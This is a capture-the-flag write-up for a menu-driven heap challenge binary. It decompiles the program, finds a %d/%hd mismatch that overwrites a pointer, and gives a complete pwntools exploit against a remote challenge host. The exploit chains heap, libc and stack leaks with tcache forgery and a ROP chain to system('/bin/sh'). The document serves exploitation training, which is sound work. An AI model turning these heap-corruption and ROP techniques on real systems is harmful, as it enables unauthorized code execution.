
![[Pasted image 20260407182323.png]]

## File & Checksec

![[Pasted image 20260407182240.png]]

> [!note]- Explanation
>
> - **Full RELRO** makes GOT overwrite attacks much harder.
> - **PIE enabled** means important code addresses are randomized each run.
> - **Canary found** makes simple stack buffer overflow attacks harder.
>
> So, the binary is protected against several common direct exploitation paths.

## Ghidra - main()

``` c

void main(void)

{
  long in_FS_OFFSET;
  undefined4 local_18;
  undefined4 local_14;
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  banner();
  menu();
  do {
    printf("> ");
    __isoc99_scanf(&DAT_001024dd,&local_18);
    getchar();
    switch(local_18) {
    default:
      puts("Invalid option");
      break;
    case 1:
      local_14 = get_idx();
      request_sub(local_14);
      break;
    case 2:
      local_14 = get_idx();
      remove_sub(local_14);
      break;
    case 3:
      local_14 = get_idx();
      change_sub(local_14);
      break;
    case 4:
      local_14 = get_idx();
      check_sub(local_14);
      break;
    case 5:
      puts("I\'m out...");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
  } while( true );
}
```

> [!note]- Explanation
>
> `main()` is just the program dispatcher.
>
> It prints the banner, shows the menu, then repeatedly reads the user's choice and calls the matching handler:
>
> - `1` → `request_sub(idx)`
> - `2` → `remove_sub(idx)`
> - `3` → `change_sub(idx)`
> - `4` → `check_sub(idx)`
> - `5` → exit
>
> `main()` only routes us into the interesting functions, so the next step is to inspect those handlers one by one.

## Ghidra - request_sub()

``` c

void request_sub(int param_1)

{
  void *pvVar1;
  
  if ((param_1 < 0) || (9 < param_1)) {
    puts("Invalid index!");
  }
  else if (*(long *)(Actors + (long)param_1 * 8) == 0) {
    pvVar1 = malloc(0x10);
    *(void **)(Actors + (long)param_1 * 8) = pvVar1;
    if (*(long *)(Actors + (long)param_1 * 8) == 0) {
                    /* WARNING: Subroutine does not return */
      _exit(1);
    }
    input_creds(param_1);
  }
  else {
    puts("Index is occupied!");
  }
  return;
}
```

> [!note]- Explanation
>
> `request_sub()` is used to create a new actor entry.
>
> First, it only accepts indexes in the range **0 to 9**, so yes, this means the program can store at most **10 actors**.
>
> If the chosen slot is empty, it allocates `0x10` bytes with `malloc(0x10)`, then stores that heap pointer into the global `Actors` array:
>
> ```c
> *(void **)(Actors + (long)param_1 * 8) = pvVar1;
> ```
>
> Since this is a 64-bit binary, each entry in `Actors` is an **8-byte pointer**, which is why the index is multiplied by `8`.
>
> So conceptually, `Actors` is just a global table of 10 pointers:
>
> - `Actors[0]`
> - `Actors[1]`
> - ...
> - `Actors[9]`
>
> and each one points to a heap chunk of size `0x10`.
>
> After allocation, the program calls `input_creds(param_1)` to fill that newly created actor structure.

## Ghidra - input_creds()

``` c

void input_creds(int param_1)

{
  long lVar1;
  char *pcVar2;
  char cVar3;
  int iVar4;
  size_t sVar5;
  void *pvVar6;
  
  printf("Name: ");
  read(0,scratch_buf,0x3f);
  pcVar2 = scratch_buf;
  sVar5 = strcspn(scratch_buf,"\n");
  pcVar2[sVar5] = '\0';
  lVar1 = *(long *)(Actors + (long)param_1 * 8);
  pvVar6 = malloc(0x3f);
  *(void **)(lVar1 + 8) = pvVar6;
  strncpy(*(char **)(*(long *)(Actors + (long)param_1 * 8) + 8),scratch_buf,0x3f);
  printf("Gender (F/M): ");
  iVar4 = getchar();
  cVar3 = (char)iVar4;
  if ((cVar3 == 'f') || (cVar3 == 'F')) {
    **(undefined1 **)(Actors + (long)param_1 * 8) = 1;
  }
  else if ((cVar3 == 'm') || (cVar3 == 'M')) {
    **(undefined1 **)(Actors + (long)param_1 * 8) = 2;
  }
  else {
    **(undefined1 **)(Actors + (long)param_1 * 8) = 0xff;
  }
  printf("Age: ");
  __isoc99_scanf(&DAT_0010258a,*(long *)(Actors + (long)param_1 * 8) + 1);
  getchar();
  printf("Height: ");
  __isoc99_scanf(&DAT_0010258a,*(long *)(Actors + (long)param_1 * 8) + 3);
  getchar();
  printf("Weight: ");
  __isoc99_scanf(&DAT_0010258a,*(long *)(Actors + (long)param_1 * 8) + 5);
  getchar();
  return;
}
```

> [!note]- Explanation
>
> From `input_creds()`, we can reconstruct the rough layout of one actor struct.
>
> The program first allocates a `0x10` chunk for the actor object itself, then allocates another `0x3f` chunk for the name buffer. After that, the fields are written into fixed offsets inside the actor chunk:
>
> - `+0`  → `gender`
> - `+1`  → `age`
> - `+3`  → `height`
> - `+5`  → `weight`
> - `+8`  → pointer to `name`
>
> So the structure looks roughly like this:
>
> ```c
> struct Actor {
>     char gender;        // +0
>     short age;          // +1
>     short height;       // +3
>     short weight;       // +5
>     // padding
>     char *name;         // +8
> };
> ```
>
> The important detail is that `age`, `height`, and `weight` are read using **`%hd`**.
>
> `%hd` means:
>
> - `%d`  → read an integer in decimal
> - `h`   → store it as a **short** (`2 bytes`)
>
> So each of those values is written as a **16-bit signed integer**.  
> That detail matters later, because writing only `2 bytes` into nearby struct fields can create small but powerful partial overwrites.

## Ghidra - Remove_sub()
``` c

void remove_sub(int param_1)

{
  if ((param_1 < 0) || (9 < param_1)) {
    puts("Invalid index!");
  }
  else if (*(long *)(Actors + (long)param_1 * 8) == 0) {
    puts("No data yet!");
  }
  else {
    free(*(void **)(*(long *)(Actors + (long)param_1 * 8) + 8));
    *(undefined8 *)(*(long *)(Actors + (long)param_1 * 8) + 8) = 0;
    free(*(void **)(Actors + (long)param_1 * 8));
    *(undefined8 *)(Actors + (long)param_1 * 8) = 0;
    puts("Submission removed successfully!");
  }
  return;
}
```

> [!note]- Explanation
>
> `remove_sub()` deletes one actor entry at a chosen index.
>
> If the index is valid and the slot is not empty, it frees **two allocations**:
>
> - first, the `name` buffer at offset `+8`
> - second, the main actor struct itself
>
> In simplified form, it does this:
>
> ```c
> free(actor->name);
> actor->name = 0;
> free(actor);
> Actors[idx] = 0;
> ```
>
> So each actor is made of **two heap chunks**:
>
> 1. the actor struct chunk
> 2. the separate name chunk
>
> This is important for the exploit, because later stages rely on controlling and freeing these heap chunks in a useful order.

## Ghidra - change_sub()

``` c

void change_sub(int param_1)

{
  long lVar1;
  char cVar2;
  int iVar3;
  size_t sVar4;
  
  if ((param_1 < 0) || (9 < param_1)) {
    puts("Invalid index!");
  }
  else if (*(long *)(Actors + (long)param_1 * 8) == 0) {
    puts("No data yet!");
  }
  else {
    printf("New Name: ");
    read(0,*(void **)(*(long *)(Actors + (long)param_1 * 8) + 8),0x3f);
    lVar1 = *(long *)(*(long *)(Actors + (long)param_1 * 8) + 8);
    sVar4 = strcspn(*(char **)(*(long *)(Actors + (long)param_1 * 8) + 8),"\n");
    *(undefined1 *)(sVar4 + lVar1) = 0;
    printf("New Gender (F/M): ");
    iVar3 = getchar();
    cVar2 = (char)iVar3;
    if ((cVar2 == 'f') || (cVar2 == 'F')) {
      **(undefined1 **)(Actors + (long)param_1 * 8) = 1;
    }
    else if ((cVar2 == 'm') || (cVar2 == 'M')) {
      **(undefined1 **)(Actors + (long)param_1 * 8) = 2;
    }
    else {
      **(undefined1 **)(Actors + (long)param_1 * 8) = 0xff;
    }
    printf("New Age: ");
    __isoc99_scanf(&DAT_0010258a,*(long *)(Actors + (long)param_1 * 8) + 1);
    getchar();
    printf("New Height: ");
    __isoc99_scanf(&DAT_0010258a,*(long *)(Actors + (long)param_1 * 8) + 3);
    getchar();
    printf("New Weight: ");
    __isoc99_scanf(&DAT_001024dd,*(long *)(Actors + (long)param_1 * 8) + 5);
    getchar();
  }
  return;
}

```

> [!note]- Explanation
>
> This is the most important function, because the bug appears here.
> 
> ![[Pasted image 20260407185605.png]]
>
> At first glance, `change_sub()` looks similar to `input_creds()`: it rewrites the actor's name and updates the same fields again.  
> But the highlighted part shows a crucial difference in the **weight** input.
>
> - In `input_creds()`, `weight` was read with **`%hd`**
> - In `change_sub()`, `weight` is read with **`%d`**
>
> The screenshot confirms this:
>
> - `DAT_001024dd` = `25 64 00` → the string **`"%d"`**
>
> That means `scanf` now treats the destination as an `int *` and writes **4 bytes**, not 2 bytes.
>
> But the destination is still:
>
> ```c
> actor + 5
> ```
>
> which is the `weight` field inside the packed actor struct.
>
> So instead of only updating the 2-byte `weight`, this write spills past it and overwrites the next bytes as well. Since the `name` pointer starts at offset `+8`, this becomes a **partial overwrite of the pointer**, specifically its lower bytes.
>
> In short:
>
> - `weight` is supposed to be a 2-byte field
> - `change_sub()` writes 4 bytes into it
> - that causes an overwrite into nearby data
> - the nearby target is the `name` pointer
>
> This is the core primitive that later gives us the **1-byte LSB overwrite**.

## Exploit Strategy Overview

> [!note]- Explanation
>
> Our exploit flow is built around the bug in `change_sub()`, where `weight` is written with `%d` instead of `%hd`.
>
> This gives us a **4-byte write** starting at offset `+5`, even though `weight` should only occupy 2 bytes.  
> As a result, the write reaches into the nearby `name` pointer and gives us a **partial pointer overwrite primitive**.
>
> We use that primitive in several stages:
>
> 1. **Hijack the `name` pointer**  
>    We corrupt the low byte(s) of an actor's `name` pointer so it points to a nearby heap region we want to inspect or modify.
>
> 2. **Leak the heap base**  
>    By redirecting one actor's `name` pointer into another actor's chunk, `check()` prints heap data as if it were a string/pointer source, which gives us a heap leak.
>
> 3. **Abuse heap metadata / tcache state**  
>    With controlled pointer redirection, we write into important heap areas such as the `tcache_perthread_struct`, making glibc believe a bin is full.
>
> 4. **Force an unsorted-bin free**  
>    We forge a chunk header so that freeing a chosen chunk sends it to the unsorted bin instead of normal tcache handling.
>
> 5. **Leak libc**  
>    Once a chunk lands in the unsorted bin, libc pointers from `main_arena` appear in heap metadata. We read that back to recover the libc base.
>
> 6. **Leak the stack through `environ`**  
>    After libc base is known, we redirect a pointer to `libc.sym['environ']` and leak a stack address.
>
> 7. **Overwrite the saved return address with a ROP chain**  
>    Using the stack leak, we calculate the saved RIP location, repoint a writable actor field there, and write a libc-based ROP chain:
>
>    ```text
>    ret -> pop rdi -> "/bin/sh" -> system
>    ```
>
> 8. **Get code execution**  
>    When `change_sub()` returns, execution follows our forged ROP chain and calls `system("/bin/sh")`.
>
> In short, the exploit path is:
>
> ```text
> partial pointer overwrite -> heap leak -> libc leak -> stack leak -> ROP -> shell
> ```

## Solve.py

``` python
from pwn import *

# ================= KONFIGURASI =================
exe = './double_trouble_patched'
elf = context.binary = ELF(exe)
libc = ELF('./libc.so.6') 
context.arch = 'amd64'

if args.REMOTE:
    io = remote('103.185.52.198', 4920)
else:
    io = process(exe)

def request(idx, name, weight):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendafter(b"Name: ", name)
    io.sendlineafter(b"(F/M): ", b"M")
    io.sendlineafter(b"Age: ", b"21")
    io.sendlineafter(b"Height: ", b"170")
    io.sendlineafter(b"Weight: ", str(weight).encode())

def change(idx, name, weight):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendafter(b"New Name: ", name)
    io.sendlineafter(b"(F/M): ", b"M")
    io.sendlineafter(b"Age: ", b"21")
    io.sendlineafter(b"Height: ", b"170")
    io.sendlineafter(b"Weight: ", str(weight).encode())

def remove(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Index: ", str(idx).encode())

def check(idx):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"Index: ", str(idx).encode())

# ================= 1. SETUP HEAP =================
log.info("Membuat 10 Actor...")
for i in range(10): 
    request(i, b"Gokong", 21)

# ================= 2. HEAP LEAK =================
log.info("Membajak Pointer Actor 0 ke Actor 1...")
change(0, b"A"*8, 1744830464)

check(0)
io.recvuntil(b"Name    : ")
heap_base = u64(io.recv(6).ljust(8, b"\x00")) - 0x380
log.success(f"HEAP BASE: {hex(heap_base)}")

# ================= 3. TCACHE ILLUSION =================
log.info("Mengelabui Tcache agar terlihat Penuh...")
change(0, p64(heap_base + 0x10), 1744830464)
change(1, b"\x07"*16, 21)

# ================= 4. FORGE UNSORTED BIN CHUNK =================
log.info("Membuat Fake Chunk Size 0x91...")
change(0, p64(heap_base + 0x3e0), 1744830464)
change(1, p64(0) + p64(0x91), 21)

log.info("Menyambungkan Pipa Fake Chunk ke Header Asli Actor 4...")
fake_chunks = b"A"*16 + p64(0) + p64(0x31)
change(3, fake_chunks, 21)

# ================= 5. THE KILL (LIBC LEAK) =================
log.info("Melepaskan Chunk ke Unsorted Bin...")
remove(2) 

change(0, p64(heap_base + 0x3f0), 1744830464)
check(1)
io.recvuntil(b"Name    : ")
main_arena_leak = u64(io.recv(6).ljust(8, b"\x00"))

log.success(f"LIBC LEAK (main_arena): {hex(main_arena_leak)}")

# ================= REM DARURAT (GDB TIME) =================
# Cek apakah leak-nya ampas (kena ASLR Null Byte)
if hex(main_arena_leak).startswith("0x6e65"):
    log.error("ZONK! Kena kutukan ASLR Null Byte (Leak: \\nGender)!")
    log.error("Jalanin ulang scriptnya (python3 apaakahiya.py) sampe dapet 0x7f...!")
    io.close()
    exit()

# Kalau leak-nya cakep (0x7f...), kita pause buat cari offset
if not args.REMOTE:
    log.info(f"[*] PID PROGRAM LOKAL LU: {io.pid}")
    log.info("[!] 1. Buka terminal baru.")
    log.info(f"[!] 2. Ketik: gdb -p {io.pid}")
    log.info("[!] 3. Di dalam GDB, ketik: vmmap libc")
    log.info("[!] 4. Cari alamat awal libc.so.6 (yang paling atas).")
    log.info("[!] 5. Kurangin LIBC LEAK di atas pake alamat awal itu di kalkulator.")
    pause()

# NOTE: KALO UDAH DAPET OFFSET ASLI, GANTI ANGKA 0x1ecbe0 DI BAWAH INI!
# UPDATE OFFSET SESUAI HASIL VMMAP TADI
offset_asli = 0x1d3cc0 
libc.address = main_arena_leak - offset_asli
log.success(f"LIBC BASE (FIXED): {hex(libc.address)}")

# Hapus pause() di bawahnya biar langsung dapet shell!

# ================= 6. STACK LEAK PIVOTING =================
log.info("Pivoting ke Actor 4 untuk Stack Leak...")
change(0, p64(heap_base + 0x4b8), 1744830464)
change(1, p64(libc.sym['environ']), 21)

check(4)
io.recvuntil(b"Name    : ")
stack_env = u64(io.recv(6).ljust(8, b"\x00"))
log.success(f"STACK ENV: {hex(stack_env)}")

# ================= 7. ROP TO SHELL =================
target_rip = stack_env - 0x140
log.info(f"Targeting RIP: {hex(target_rip)}")

change(0, p64(heap_base + 0x4b8), 1744830464)
change(1, p64(target_rip), 21)

pop_rdi = libc.address + 0x277e5
ret = libc.address + 0x26e99
bin_sh = next(libc.search(b"/bin/sh"))
system = libc.sym['system']

payload = p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)

log.info("Mengirim ROP Chain...")
change(4, payload, 21)

log.success("Exploit Selesai! Enjoy your shell! 🚀")
io.interactive()
```

> [!note]- Solver Overview
>
> The solver is built around one core primitive: we use the buggy `weight` write in `change_sub()` to partially corrupt an actor's `name` pointer.
>
> Once we can redirect that pointer, the exploit becomes a chain of:
>
> ```text
> pointer hijack -> heap leak -> unsorted-bin libc leak -> environ stack leak -> ROP
> ```
>
> The helper functions in the script (`request`, `change`, `remove`, and `check`) are just wrappers around the program menu, so the real logic starts in the exploit stages below.

> [!note]- Stage 1 — Heap Setup
>
> ```python
> log.info("Membuat 10 Actor...")
> for i in range(10): 
>     request(i, b"Gokong", 21)
> ```
>
> We first allocate all 10 actor slots to make the heap layout predictable.
>
> A common assumption is that `malloc()` will always place chunks neatly next to each other, but that is not guaranteed.  
> 
> If freed chunks of the right size already exist in allocator bins, `malloc()` may reuse those instead, which can make the layout less clean.
>
> By filling all available actor slots, we force the program to populate the heap with our own chunks in a dense and mostly regular pattern.
>
> This is enough for our exploit because:
>
> - the program only allows **10 actors** total
> - each actor gives us **two controlled heap chunks**
>
> So this stage is simply about preparing a controlled heap layout before triggering the real bug.

> [!note]- Stage 2 — Heap Leak
>
> ```python
> change(0, b"A"*8, 1744830464)
>
> check(0)
> io.recvuntil(b"Name    : ")
> heap_base = u64(io.recv(6).ljust(8, b"\x00")) - 0x380
> ```
>
> This is the first real use of the bug.
>
> The vulnerable write happens in `change_sub()` when `weight` is read with `%d`.  
> Even though `weight` should only take 2 bytes, `%d` writes 4 bytes starting at offset `+5`, so the write reaches into the nearby `name` pointer.
>
> Since the system is **little-endian**, the lowest byte of a 64-bit pointer is stored first in memory.
>
> For example, if a pointer is:
>
> ```text
> 0x0000555555559360
> ```
>
> in memory it looks like:
>
> ```text
> 60 93 55 55 55 55 00 00
> ```
>
> So if our overwrite touches only the first byte of that pointer, we are changing the **least significant byte (LSB)**.
>
> That means a pointer like:
>
> ```text
> 0x0000555555559360
> ```
>
> can become something nearby such as:
>
> ```text
> 0x0000555555559368
> ```
>
> without changing the higher bytes at all.
>
> This is why the corrupted `name` pointer still stays inside the same general heap region, but now points to a different nearby location.
>
> After that, we call:
>
> ```python
> check(0)
> ```
>
> and we should recall what `check()` effectively does:
>
> ```c
> printf("Name    : %s", actor->name);
> ```
>
> So the program does **not** print the pointer value itself.  
> Instead, it **dereferences `actor->name`** and reads bytes from that new heap address.
>
> Because we redirected the pointer into a useful heap location, `check()` now prints data from there instead of the original name buffer.
>
> Locally, we can confirm this redirected target in GDB/pwndbg using tools like `telescope`.  
> From that local observation, we know the leaked heap pointer sits at a fixed offset from the heap base, so we compute:
>
> ```python
> heap_base = leaked_ptr - 0x380
> ```
>
> In other words:
>
> - the `%d` bug corrupts the low byte of the `name` pointer
> - little-endian layout makes that an LSB overwrite
> - `check()` later dereferences that corrupted pointer through `%s`
> - the redirected heap contents give us a leak
> - and from local telescope/debugging, we know that leak is `0x380` bytes away from the heap base

> [!note]- Stage 3 — Tcache Illusion
>
> ```python
> change(0, p64(heap_base + 0x10), 1744830464)
> change(1, b"\x07"*16, 21)
> ```
>
> After leaking the heap base, we no longer aim blindly.  
> We now redirect the corrupted pointer to a very specific heap area near the start of the heap: the **`tcache_perthread_struct`**.
>
> This structure is important because glibc uses it to manage the **tcache bins**, which are the allocator's fast per-thread freelists for small chunks.
>
> Conceptually, each tcache bin has a small **count** that tells glibc:
>
> ```text
> how many freed chunks of this size are already stored here
> ```
>
> By default, a tcache bin can only hold up to **7 chunks**.
>
> So the logic is roughly:
>
> - if the bin count is **less than 7**, a freed chunk of that size goes into tcache
> - if the bin count is already **7**, tcache is considered full for that size
> - then glibc must use another path instead of tcache
>
> That is exactly what we want to abuse.
>
> With:
>
> ```python
> change(1, b"\x07"*16, 21)
> ```
>
> we overwrite the count bytes and fake them as if those tcache bins are already full.
>
> In other words, we are lying to glibc:
>
> ```text
> "this bin already contains 7 chunks"
> ```
>
> even though we did not actually free 7 real chunks into it.
>
> This matters because later we plan to `free()` a chunk, and if glibc still thinks the relevant tcache bin has room, the chunk would simply go into tcache, which is **not** what we want.
>
> Our real goal is to push that chunk into the **unsorted bin**, because unsorted-bin chunks carry much more useful metadata for leaking libc.
>
> So this stage is basically a setup step:
>
> - redirect our write into `tcache_perthread_struct`
> - forge the tcache counts as `7`
> - make glibc believe the target tcache bin is full
> - so the next free will avoid tcache and can fall into the unsorted-bin path instead

> [!note]- Stage 4 — Why `0x91` and `0x31` Are Needed
>
> This stage can be confusing at first, because the fake tcache-full state alone is **not enough**.
>
> It is true that after we forge the tcache count to `7`, a later `free()` will no longer put the chunk into tcache.  
> But glibc still checks whether the chunk being freed looks like a **valid heap chunk**.
>
> So this stage is about making the target chunk look valid enough to survive `free()` checks.
>
> ---
>
> **Why `0x91`?**
>
> ```python
> change(1, p64(0) + p64(0x91), 21)
> ```
>
> In glibc, the chunk size field also stores flag bits in its lowest bits.
>
> So:
>
> - `0x90` = the actual chunk size
> - `0x1`  = `prev_inuse`
> - `0x91` = `0x90 | 0x1`
>
> That means `0x91` is simply the encoded heap metadata value for:
>
> ```text
> "this is a valid 0x90-sized chunk, and the previous chunk is in use"
> ```
>
> We forge this so that when `free()` inspects the chunk, it sees a believable size field instead of corrupted garbage.
>
> ---
>
> **Why do we need the chunk to look like size `0x90`?**
>
> Because we want the freed chunk to take the allocator path that eventually lands in the **unsorted bin** once tcache is unavailable.
>
> So the fake `0x91` is not “the unsorted-bin magic number.”  
> It is just the heap header value that makes the target look like a valid freeable chunk of the size we want.
>
> ---
>
> **Why `0x31`?**
>
> ```python
> fake_chunks = b"A"*16 + p64(0) + p64(0x31)
> change(3, fake_chunks, 21)
> ```
>
> This part prepares the **next chunk header**.
>
> Again, in encoded form:
>
> - `0x30` = chunk size
> - `0x1`  = `prev_inuse`
> - `0x31` = valid encoded size field
>
> So `0x31` means:
>
> ```text
> "this next chunk is a valid 0x30-sized chunk"
> ```
>
> This is important because when glibc frees a chunk, it may also inspect the surrounding chunk boundaries.  
> If the next chunk header looks invalid, `free()` can detect heap corruption and abort.
>
> So `0x31` is there to make the **neighboring chunk boundary** look sane.
>
> ---
>
> **Intuition**
>
> You can think of this stage like forging a fake ID card for the heap chunk.
>
> - `0x91` makes the chunk we want to free look legitimate
> - `0x31` makes the nearby next chunk look legitimate too
>
> The fake tcache-full trick only answers:
>
> ```text
> "where will the chunk go after free?"
> ```
>
> but `0x91` and `0x31` answer:
>
> ```text
> "will glibc even accept this chunk as valid during free?"
> ```
>
> We need both:
>
> 1. **tcache looks full** → so the chunk does not go to tcache
> 2. **chunk metadata looks valid** → so `free()` does not crash
>
> Once both conditions hold, freeing the chunk can proceed through the **unsorted-bin path**.

> [!note]- Stage 5 — Free the Chunk and Leak Libc
>
> ```python
> remove(2)
>
> change(0, p64(heap_base + 0x3f0), 1744830464)
> check(1)
> io.recvuntil(b"Name    : ")
> main_arena_leak = u64(io.recv(6).ljust(8, b"\x00"))
> ```
>
> This is the payoff of the previous setup.
>
> When we call:
>
> ```python
> remove(2)
> ```
>
> the target chunk is freed. Under normal conditions, a small freed chunk would usually go into **tcache** first.
>
> But in the previous stage, we already forged the tcache counts to look **full**.  
> So glibc takes the next path and puts the chunk into the **unsorted bin** instead.
>
> That is exactly what we wanted, because unsorted-bin chunks receive allocator pointers from libc, specifically pointers related to `main_arena`.
>
> After the free, we redirect our corrupted pointer once again so `check()` reads from the freed chunk metadata area.
>
> Then:
>
> ```python
> check(1)
> ```
>
> prints bytes from that region, and those bytes now include a libc pointer.
>
> So this stage gives us our **libc leak**, stored in:
>
> ```python
> main_arena_leak
> ```

> [!note]- Stage 5.5 — Compute the Libc Base
>
> ```python
> offset_asli = 0x1d3cc0
> libc.address = main_arena_leak - offset_asli
> ```
>
> The leaked value is not the libc base directly.  
> It is a pointer into libc, specifically into the `main_arena` region.
>
> So we subtract the known offset of that leaked location inside the provided libc:
>
> ```python
> libc base = main_arena leak - 0x1d3cc0
> ```
>
> This offset was obtained from local analysis using the matching libc.  
> Once we compute `libc.address`, we can resolve useful symbols such as:
>
> - `system`
> - `environ`
> - `"/bin/sh"`
> - ROP gadgets inside libc

> [!note]- Reliability Note
>
> ```python
> if hex(main_arena_leak).startswith("0x6e65"):
>     ...
> ```
>
> Sometimes the leak is bad because the printed bytes are cut early or mixed with nearby text output.
>
> In that case, the script detects the broken leak and exits so it can be rerun.  
> This is only a reliability check, not a separate exploitation idea.

> [!note]- Stage 6 — Leak a Stack Address via `environ`
>
> ```python
> change(0, p64(heap_base + 0x4b8), 1744830464)
> change(1, p64(libc.sym['environ']), 21)
>
> check(4)
> io.recvuntil(b"Name    : ")
> stack_env = u64(io.recv(6).ljust(8, b"\x00"))
> ```
>
> After recovering the libc base, we can now target libc symbols precisely.
>
> The next goal is to leak a **stack address**.  
> For that, we use:
>
> ```python
> libc.sym['environ']
> ```
>
> `environ` is a libc symbol that stores a pointer into the current process stack.  
> So if we can make `check()` read from `environ`, we get a stack leak.
>
> That is what these two lines do:
>
> - first, redirect our corrupted heap pointer to the right actor slot
> - then overwrite that actor's `name` pointer so it now points to `environ`
>
> When `check(4)` runs, the program dereferences that pointer and prints the stack address stored there.
>
> This gives us:
>
> ```python
> stack_env
> ```
>
> which is our bridge from heap/libc control into stack control.

> [!note]- Stage 7 — Locate the Saved Return Address
>
> ```python
> target_rip = stack_env - 0x140
> ```
>
> The `environ` leak does not point directly to the saved return address.  
> It only gives us a nearby stack reference.
>
> So we use a known stack offset:
>
> ```python
> stack_env - 0x140
> ```
>
> to reach the saved RIP of the active `change_sub()` call.
>
> This `0x140` value is not universal.  
> It was obtained from local debugging by observing the stack layout for this binary and this environment.

> [!note]- Stage 8 — Repoint the Write onto Saved RIP
>
> ```python
> change(0, p64(heap_base + 0x4b8), 1744830464)
> change(1, p64(target_rip), 21)
> ```
>
> Now we pivot one last time.
>
> Instead of making an actor's `name` pointer reference heap data or libc data, we make it reference:
>
> ```python
> target_rip
> ```
>
> which is the saved return address on the stack.
>
> That means the next name write through that actor will no longer modify heap memory.  
> It will directly overwrite the saved RIP of `change_sub()`.

> [!note]- Stage 9 — Build the ROP Chain
>
> ```python
> pop_rdi = libc.address + 0x277e5
> ret = libc.address + 0x26e99
> bin_sh = next(libc.search(b"/bin/sh"))
> system = libc.sym['system']
>
> payload = p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)
> ```
>
> Since NX is enabled, we cannot place shellcode on the stack and execute it directly.  
> So instead, we reuse code that already exists inside libc with a small ROP chain.
>
> The chain is:
>
> ```text
> ret -> pop rdi -> "/bin/sh" -> system
> ```
>
> Its job is:
>
> 1. use `ret` for stack alignment
> 2. load the address of `"/bin/sh"` into `RDI`
> 3. call `system("/bin/sh")`
>
> This is enough to turn control of saved RIP into code execution.

> [!note]- Stage 10 — Overwrite RIP and Get Shell
>
> ```python
> change(4, payload, 21)
> io.interactive()
> ```
>
> Finally, we send the ROP payload through the actor whose `name` pointer now targets the saved return address.
>
> So this write no longer updates a normal heap string buffer.  
> It writes our ROP chain directly onto the stack.
>
> When `change_sub()` returns, execution follows our forged chain instead of the original control flow, and eventually calls:
>
> ```text
> system("/bin/sh")
> ```
>
> At that point, we get an interactive shell.

> [!note]- Final Recap
>
> The full exploitation path is:
>
> ```text
> oversized %d write on weight
> -> partial overwrite of name pointer
> -> heap leak
> -> fake tcache-full state
> -> forge unsorted-bin chunk
> -> libc leak from main_arena
> -> stack leak from environ
> -> overwrite saved RIP
> -> ROP to system("/bin/sh")
> ```
>
> So even though the original bug looks small, it is strong enough to grow into full remote code execution.

## FLAG

![[Pasted image 20260407194313.png]]